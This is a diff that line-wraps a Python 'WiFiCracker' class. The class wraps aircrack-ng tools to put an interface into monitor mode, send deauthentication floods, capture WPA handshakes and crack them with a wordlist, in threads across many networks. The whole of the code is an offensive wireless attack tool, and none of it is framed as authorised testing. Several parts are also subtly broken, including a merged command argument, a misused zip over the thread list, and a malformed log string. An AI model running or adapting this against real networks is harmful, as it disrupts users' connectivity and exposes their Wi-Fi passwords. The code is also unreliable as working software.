@@ -15,22 +15,33 @@ class WiFiCracker:
 
     def start_interface(self):
         command = ["ifconfig", self.interface, "up"]
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
         output, error = process.communicate()
         if error:
             raise Exception("Error:", error.decode())
 
     def create_monitor_mode(self):
         command = ["airmon-ng", "start", self.interface]
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(
+            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
         output, error = process.communicate()
         if error:
             raise Exception("Error:", error.decode())
 
     def deauth_attack(self, bssid):
-        command = ["aireplay-ng", "--deauth", f"100 -a {bssid}", self.interface + ".monitor"]
+        command = [
+            "aireplay-ng",
+            "--deauth",
+            f"100 -a {bssid}",
+            self.interface + ".monitor",
+        ]
         try:
-            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(
+                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
             output, error = process.communicate()
             if error:
                 raise Exception("Error:", error.decode())
@@ -39,9 +50,20 @@ class WiFiCracker:
             raise
 
     def handshake_capture(self, bssid):
-        command = ["airodump-ng", "--bssid", bssid, "--channel", "6", f"{self.interface}.monitor", "-w", f"{bssid}_handshake"]
+        command = [
+            "airodump-ng",
+            "--bssid",
+            bssid,
+            "--channel",
+            "6",
+            f"{self.interface}.monitor",
+            "-w",
+            f"{bssid}_handshake",
+        ]
         try:
-            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(
+                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
             output, error = process.communicate()
             if error:
                 raise Exception("Error:", error.decode())
@@ -56,7 +78,9 @@ class WiFiCracker:
     def crack_wpa(self, bssid, capfile):
         command = ["aircrack-ng", "-w", "wordlist.txt", f"{capfile}", bssid]
         try:
-            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(
+                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
             output, error = process.communicate()
             if error:
                 raise Exception("Error:", error.decode())
@@ -74,8 +98,16 @@ class WiFiCracker:
         threads = []
         for bssid in bssids:
             deauth_thread = threading.Thread(target=self.deauth_attack, args=(bssid,))
-            capture_thread = threading.Thread(target=self.handshake_capture, args=(bssid,))
-            crack_thread = threading.Thread(target=self.crack_wpa, args=(bssid, f"{bssid}_handshake",))
+            capture_thread = threading.Thread(
+                target=self.handshake_capture, args=(bssid,)
+            )
+            crack_thread = threading.Thread(
+                target=self.crack_wpa,
+                args=(
+                    bssid,
+                    f"{bssid}_handshake",
+                ),
+            )
             threads.append((deauth_thread, capture_thread, crack_thread))
 
         for deauth_thread, capture_thread, crack_thread in zip(*threads):
@@ -85,7 +117,7 @@ class WiFiCracker:
             capture_thread.join()
             crack_thread.start()
 
-    def _install_from_brew(self)->bool:
+    def _install_from_brew(self) -> bool:
         """
         Installs all tools or validate that they are installed
         :return: True if all is good, False otherwise
@@ -94,7 +126,6 @@ class WiFiCracker:
             os.execv(sys.executable, [sys.executable] + sys.argv)
         except Exception as e:
             logging.error(f'Error installing tools: {e}")')
-
 
 
 if __name__ == "__main__":
